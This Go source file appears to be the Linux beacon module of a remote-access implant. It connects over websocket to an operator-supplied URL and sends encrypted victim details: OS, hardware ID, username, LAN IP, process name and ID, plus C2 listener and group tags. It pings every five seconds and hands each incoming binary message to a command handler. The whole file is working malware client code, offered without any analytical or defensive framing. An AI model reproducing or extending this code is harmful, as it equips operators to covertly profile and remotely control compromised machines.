//go:build linux
// +build linux

package ws

import (
	"main/Encrypt"
	HandlePacket "main/HandlePacket/ws"
	"main/MessagePack"
	"main/PcInfo"
	"runtime"
	"sync"
	"time"

	"github.com/togettoyou/wsc"
)

type Client struct {
	Connection *wsc.Wsc
	lock       sync.Mutex
	keepAlive  *time.Ticker
}

func (c *Client) SendData(data []byte) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	c.Connection.SendBinaryMessage(endata)
}
func Run_main(url string) {
	client := &Client{}
	client.Connect(url)
}

func SendInfo() []byte {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetLinuxVersion())
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetCurrentUser())
	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("SleepTime").SetAsString("10")
	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
	//msgpack.ForcePathObject("Admin").SetAsString(syscalls.IsAdmin())
	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
	return msgpack.Encode2Bytes()
}

func (c *Client) Connect(url string) {
	runtime.GC()
	done := make(chan bool)
	c.Connection = wsc.New(url)
	c.Connection.SetConfig(&wsc.Config{
		WriteWait:         10 * time.Second,
		MinRecTime:        2 * time.Second,
		MaxRecTime:        60 * time.Second,
		RecFactor:         1.5,
		MessageBufferSize: 10240 * 10,
	})

	c.Connection.OnConnected(func() {
		c.SendData(SendInfo())

	})

	c.Connection.OnConnectError(func(err error) {

	})

	c.Connection.OnDisconnected(func(err error) {
	})

	c.Connection.OnClose(func(code int, text string) {
		done <- true
	})
	c.Connection.OnTextMessageSent(func(message string) {

	})
	c.Connection.OnBinaryMessageSent(func(data []byte) {

	})
	c.Connection.OnSentError(func(err error) {

	})
	c.Connection.OnPingReceived(func(appData string) {

		runtime.GC()
	})
	c.Connection.OnPongReceived(func(appData string) {

	})

	c.Connection.OnTextMessageReceived(func(message string) {
	})

	c.Connection.OnBinaryMessageReceived(func(data []byte) {
		go func() {
			HandlePacket.Read(data, c.Connection)
		}()
	})
	c.keepAlive = time.NewTicker(5 * time.Second)

	c.Connection.Connect()
	go func() {
		for range c.keepAlive.C {
			c.KeepAlivePacket()
		}
	}()
	for {
		select {
		case <-done:
			return
		}
	}
}

func (c *Client) KeepAlivePacket() {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
	msgpack.ForcePathObject("Message").SetAsString("DDDD")
	c.SendData(msgpack.Encode2Bytes())
}
